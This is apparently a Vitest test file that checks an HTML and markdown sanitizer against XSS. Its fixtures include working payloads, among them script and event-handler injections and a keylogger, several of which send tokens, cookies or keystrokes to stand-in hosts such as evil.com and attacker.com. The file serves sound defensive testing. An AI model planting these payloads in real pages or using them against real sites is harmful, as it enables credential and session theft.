// Security tests for MDSG XSS prevention and input validation
import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { MinimalSecurity } from '../src/utils/security-minimal.js';

// Use MinimalSecurity as SecureHTML for compatibility with tests
const SecureHTML = MinimalSecurity;

describe('Security Features', () => {
  describe('XSS Prevention', () => {
    it('should sanitize script tags completely', () => {
      const malicious = '<script>alert("XSS")</script><p>Safe content</p>';
      const cleaned = SecureHTML.sanitize(malicious);

      expect(cleaned).not.toContain('<script>');
      expect(cleaned).not.toContain('alert');
      expect(cleaned).toContain('<p>Safe content</p>');
    });

    it('should remove event handler attributes', () => {
      const malicious = '<img src="x" onerror="alert(1)" alt="test">';
      const cleaned = SecureHTML.sanitize(malicious);

      expect(cleaned).not.toContain('onerror');
      expect(cleaned).not.toContain('alert');
      expect(cleaned).toContain('alt="test"');
    });

    it('should remove javascript: URLs', () => {
      const malicious = '<a href="javascript:alert(1)">Click me</a>';
      const cleaned = SecureHTML.sanitize(malicious);

      expect(cleaned).not.toContain('javascript:');
      expect(cleaned).not.toContain('alert');
    });

    it('should remove vbscript: URLs', () => {
      const malicious = '<a href="vbscript:msgbox(1)">Click me</a>';
      const cleaned = SecureHTML.sanitize(malicious);

      expect(cleaned).not.toContain('vbscript:');
      expect(cleaned).not.toContain('msgbox');
    });

    it('should remove data: URLs with HTML content', () => {
      const malicious = '<iframe src="data:text/html,<script>alert(1)</script>"></iframe>';
      const cleaned = SecureHTML.sanitize(malicious);

      expect(cleaned).not.toContain('data:text/html');
      expect(cleaned).not.toContain('<iframe');
    });

    it('should preserve safe HTML elements and attributes', () => {
      const safe = '<h1 id="title" class="heading">Title</h1><p><strong>Bold</strong> and <em>italic</em> text with <code>code</code></p>';
      const cleaned = SecureHTML.sanitize(safe);

      expect(cleaned).toContain('<h1');
      expect(cleaned).toContain('id="title"');
      expect(cleaned).toContain('class="heading"');
      expect(cleaned).toContain('<strong>Bold</strong>');
      expect(cleaned).toContain('<em>italic</em>');
      expect(cleaned).toContain('<code>code</code>');
    });

    it('should make external links safe with target="_blank" and rel attributes', () => {
      const html = '<a href="https://example.com">External link</a>';
      const cleaned = SecureHTML.sanitize(html);

      expect(cleaned).toContain('target="_blank"');
      expect(cleaned).toContain('rel="noopener noreferrer"');
    });

    it('should handle nested XSS attempts', () => {
      const malicious = '<div><p>Safe content</p><script>alert("nested")</script><strong>More safe content</strong></div>';
      const cleaned = SecureHTML.sanitize(malicious);

      expect(cleaned).not.toContain('<script>');
      expect(cleaned).not.toContain('alert');
      expect(cleaned).toContain('<p>Safe content</p>');
      expect(cleaned).toContain('<strong>More safe content</strong>');
    });

    it('should remove iframe elements completely', () => {
      const malicious = '<p>Safe content</p><iframe src="https://evil.com"></iframe><p>More content</p>';
      const cleaned = SecureHTML.sanitize(malicious);

      expect(cleaned).not.toContain('<iframe');
      expect(cleaned).not.toContain('evil.com');
      expect(cleaned).toContain('<p>Safe content</p>');
      expect(cleaned).toContain('<p>More content</p>');
    });

    it('should handle complex XSS attack vectors', () => {
      const complexAttack = `
        <div onclick="alert('xss')" onmouseover="fetch('/steal?data='+document.cookie)">
          <img src="x" onerror="eval(atob('YWxlcnQoJ1hTUycpOw=='))">
          <a href="javascript:void(0)" onclick="window.location='http://evil.com'">
            <script>document.write('<img src=x onerror=alert(1)>')</script>
            Innocent link
          </a>
        </div>
      `;
      const cleaned = SecureHTML.sanitize(complexAttack);

      expect(cleaned).not.toContain('onclick');
      expect(cleaned).not.toContain('onmouseover');
      expect(cleaned).not.toContain('onerror');
      expect(cleaned).not.toContain('alert');
      expect(cleaned).not.toContain('eval');
      expect(cleaned).not.toContain('javascript:');
      expect(cleaned).not.toContain('<script>');
      expect(cleaned).not.toContain('document.write');
      expect(cleaned).not.toContain('evil.com');
      expect(cleaned).toContain('Innocent link');
    });
  });

  describe('Markdown Content Validation', () => {
    it('should detect suspicious markdown patterns', () => {
      const suspiciousMarkdown = '# Title\n<script>alert("xss")</script>\nSafe content';
      const result = SecureHTML.sanitizeMarkdown(suspiciousMarkdown);

      // Should escape the entire content when suspicious patterns are found
      expect(result).not.toContain('<script>');
      expect(result).toContain('&lt;script&gt;');
    });

    it('should allow safe markdown content', () => {
      const safeMarkdown = '# Title\n\n**Bold text** and *italic text*\n\n[Link](https://example.com)';
      const result = SecureHTML.sanitizeMarkdown(safeMarkdown);

      expect(result).toBe(safeMarkdown);
    });

    it('should detect javascript: URLs in markdown', () => {
      const maliciousMarkdown = '[Click me](javascript:alert("xss"))';
      const result = SecureHTML.sanitizeMarkdown(maliciousMarkdown);

      expect(result).not.toContain('javascript:');
      expect(result).toContain('&lt;');
    });

    it('should detect vbscript: URLs in markdown', () => {
      const maliciousMarkdown = '[Click me](vbscript:msgbox("xss"))';
      const result = SecureHTML.sanitizeMarkdown(maliciousMarkdown);

      expect(result).not.toContain('vbscript:');
      expect(result).toContain('&lt;');
    });
  });

  describe('URL Validation', () => {
    it('should validate safe HTTP URLs', () => {
      expect(SecureHTML.isValidURL('https://example.com')).toBe(true);
      expect(SecureHTML.isValidURL('http://example.com')).toBe(true);
      expect(SecureHTML.isValidURL('ftp://files.example.com')).toBe(true);
      expect(SecureHTML.isValidURL('mailto:test@example.com')).toBe(true);
    });

    it('should allow relative URLs', () => {
      expect(SecureHTML.isValidURL('/path/to/page')).toBe(true);
      expect(SecureHTML.isValidURL('./relative/path')).toBe(true);
      expect(SecureHTML.isValidURL('#anchor')).toBe(true);
    });

    it('should reject dangerous URL schemes', () => {
      expect(SecureHTML.isValidURL('javascript:alert(1)')).toBe(false);
      expect(SecureHTML.isValidURL('vbscript:msgbox(1)')).toBe(false);
      expect(SecureHTML.isValidURL('data:text/html,<script>alert(1)</script>')).toBe(false);
    });

    it('should handle invalid URL inputs', () => {
      expect(SecureHTML.isValidURL(null)).toBe(false);
      expect(SecureHTML.isValidURL(undefined)).toBe(false);
      expect(SecureHTML.isValidURL(123)).toBe(false);
      expect(SecureHTML.isValidURL('')).toBe(false);
    });
  });

  describe('Attribute Sanitization', () => {
    it('should sanitize safe attributes', () => {
      const attributes = {
        class: 'safe-class',
        id: 'safe-id',
        href: 'https://example.com',
        alt: 'Image description'
      };

      const sanitized = SecureHTML.sanitizeAttributes(attributes);

      expect(sanitized).toEqual(attributes);
    });

    it('should remove dangerous event handler attributes', () => {
      const attributes = {
        class: 'safe-class',
        onclick: 'alert("xss")',
        onmouseover: 'steal()',
        onerror: 'attack()'
      };

      const sanitized = SecureHTML.sanitizeAttributes(attributes);

      expect(sanitized.class).toBe('safe-class');
      expect(sanitized.onclick).toBeUndefined();
      expect(sanitized.onmouseover).toBeUndefined();
      expect(sanitized.onerror).toBeUndefined();
    });

    it('should validate URLs in href and src attributes', () => {
      const attributes = {
        href: 'javascript:alert("xss")',
        src: 'https://example.com/image.jpg',
        alt: 'Image'
      };

      const sanitized = SecureHTML.sanitizeAttributes(attributes);

      expect(sanitized.href).toBeUndefined(); // Invalid URL removed
      expect(sanitized.src).toBe('https://example.com/image.jpg');
      expect(sanitized.alt).toBe('Image');
    });

    it('should escape string values in attributes', () => {
      const attributes = {
        alt: 'Image with "quotes" and <tags>',
        title: 'Title with & ampersand'
      };

      const sanitized = SecureHTML.sanitizeAttributes(attributes);

      expect(sanitized.alt).toBe('Image with &quot;quotes&quot; and &lt;tags&gt;');
      expect(sanitized.title).toBe('Title with &amp; ampersand');
    });
  });

  describe('Text Escaping', () => {
    it('should escape HTML special characters', () => {
      const dangerous = '<script>alert("xss")</script>';
      const escaped = SecureHTML.escapeText(dangerous);

      expect(escaped).toBe('&lt;script&gt;alert(&quot;xss&quot;)&lt;&#x2F;script&gt;');
    });

    it('should escape all dangerous characters', () => {
      const text = '<>&"\'\/';
      const escaped = SecureHTML.escapeText(text);

      expect(escaped).toBe('&lt;&gt;&amp;&quot;&#39;&#x2F;');
    });

    it('should handle non-string inputs safely', () => {
      expect(SecureHTML.escapeText(null)).toBe('');
      expect(SecureHTML.escapeText(undefined)).toBe('');
      expect(SecureHTML.escapeText(123)).toBe('');
      expect(SecureHTML.escapeText({})).toBe('');
    });
  });

  describe('DOM Rendering Security', () => {
    let container;

    beforeEach(() => {
      // Create a mock DOM element for testing
      container = {
        innerHTML: '',
        querySelectorAll: vi.fn().mockReturnValue([]),
        querySelector: vi.fn().mockReturnValue(null)
      };
    });

    it('should safely render HTML to container', () => {
      const html = '<p>Safe content</p><script>alert("xss")</script>';

      SecureHTML.sanitizeAndRender(html, container);

      expect(container.innerHTML).toContain('<p>Safe content</p>');
      expect(container.innerHTML).not.toContain('<script>');
      expect(container.innerHTML).not.toContain('alert');
    });

    it('should handle invalid container gracefully', () => {
      const html = '<p>Content</p>';

      // Should not throw error with invalid container
      expect(() => {
        SecureHTML.sanitizeAndRender(html, null);
        SecureHTML.sanitizeAndRender(html, undefined);
        SecureHTML.sanitizeAndRender(html, {});
      }).not.toThrow();
    });
  });

  describe('Configuration Modes', () => {
    it('should provide strict configuration for minimal HTML', () => {
      const config = SecureHTML.getConfig('strict');

      expect(config.ALLOWED_TAGS).toEqual(['p', 'br', 'strong', 'em', 'code']);
      expect(config.FORBID_TAGS).toContain('img');
      expect(config.FORBID_TAGS).toContain('a');
    });

    it('should provide minimal configuration for very basic content', () => {
      const config = SecureHTML.getConfig('minimal');

      expect(config.ALLOWED_TAGS).toEqual(['p', 'br']);
      expect(config.ALLOWED_ATTR).toEqual([]);
    });

    it('should default to basic configuration', () => {
      const config = SecureHTML.getConfig('invalid');

      expect(config).toEqual({});
    });
  });

  describe('Error Handling', () => {
    it('should handle DOMPurify failures gracefully', () => {
      // Mock DOMPurify to throw an error
      const originalSanitize = SecureHTML.sanitize;

      // This test ensures the fallback works if DOMPurify ever fails
      const result = SecureHTML.escapeText('<script>alert("xss")</script>');

      expect(result).toBe('&lt;script&gt;alert(&quot;xss&quot;)&lt;&#x2F;script&gt;');
    });

    it('should handle non-string inputs to sanitize method', () => {
      expect(SecureHTML.sanitize(null)).toBe('');
      expect(SecureHTML.sanitize(undefined)).toBe('');
      expect(SecureHTML.sanitize(123)).toBe('');
      expect(SecureHTML.sanitize({})).toBe('');
      expect(SecureHTML.sanitize([])).toBe('');
    });
  });

  describe('Real-world Attack Scenarios', () => {
    it('should prevent token theft via localStorage access', () => {
      const maliciousMarkdown = `
# My Site
<img src="x" onerror="fetch('https://evil.com/steal?token=' + localStorage.getItem('github_token'))">
Safe content here.
      `;

      const cleaned = SecureHTML.sanitize(maliciousMarkdown);

      expect(cleaned).not.toContain('onerror');
      expect(cleaned).not.toContain('localStorage');
      expect(cleaned).not.toContain('evil.com');
      expect(cleaned).toContain('Safe content here.');
    });

    it('should prevent cookie theft attempts', () => {
      const maliciousMarkdown = `
<div onclick="document.location='http://attacker.com/steal.php?cookie='+document.cookie">
  Click me for free stuff!
</div>
      `;

      const cleaned = SecureHTML.sanitize(maliciousMarkdown);

      expect(cleaned).not.toContain('onclick');
      expect(cleaned).not.toContain('document.location');
      expect(cleaned).not.toContain('document.cookie');
      expect(cleaned).not.toContain('attacker.com');
      expect(cleaned).toContain('Click me for free stuff!');
    });

    it('should prevent form submission hijacking', () => {
      const maliciousMarkdown = `
<form action="https://evil.com/harvest" method="post">
  <input type="hidden" name="token" value="stolen">
</form>
<script>document.forms[0].submit();</script>
      `;

      const cleaned = SecureHTML.sanitize(maliciousMarkdown);

      expect(cleaned).not.toContain('<form');
      expect(cleaned).not.toContain('<input');
      expect(cleaned).not.toContain('<script>');
      expect(cleaned).not.toContain('evil.com');
    });

    it('should prevent keylogger injection', () => {
      const maliciousMarkdown = `
<div onkeypress="sendKey(event.key)" onkeydown="logKey(event)">
  Type your password here: <input type="password">
</div>
<script>
function sendKey(key) {
  fetch('https://evil.com/log?key=' + key);
}
</script>
      `;

      const cleaned = SecureHTML.sanitize(maliciousMarkdown);

      expect(cleaned).not.toContain('onkeypress');
      expect(cleaned).not.toContain('onkeydown');
      expect(cleaned).not.toContain('<input');
      expect(cleaned).not.toContain('<script>');
      expect(cleaned).not.toContain('sendKey');
      expect(cleaned).not.toContain('evil.com');
    });
  });
});

// Integration test with actual markdown processing
describe('Integration Security Tests', () => {
  it('should safely handle complex markdown with embedded HTML', () => {
    const complexContent = `
# My Blog Post

This is **normal markdown** with *emphasis*.

<div class="highlight">
  <p>Some HTML content</p>
  <script>alert("This should be removed!")</script>
  <img src="image.jpg" alt="Safe image" onerror="alert('This should be removed!')">
</div>

## Code Example

\`\`\`javascript
function safe() {
  console.log("This is fine");
}
\`\`\`

[Safe link](https://example.com)
[Dangerous link](javascript:alert("xss"))

<a href="https://safe.com" onclick="alert('unsafe')">Mixed safety</a>
    `;

    const cleaned = SecureHTML.sanitize(complexContent);

    // Should preserve safe content
    expect(cleaned).toContain('<p>Some HTML content</p>');
    expect(cleaned).toContain('alt="Safe image"');
    expect(cleaned).toContain('href="https://safe.com"');

    // Should remove dangerous content
    expect(cleaned).not.toContain('<script>');
    expect(cleaned).not.toContain('onerror');
    expect(cleaned).not.toContain('onclick');
    expect(cleaned).not.toContain('javascript:alert');
    expect(cleaned).not.toContain('This should be removed');
  });
});
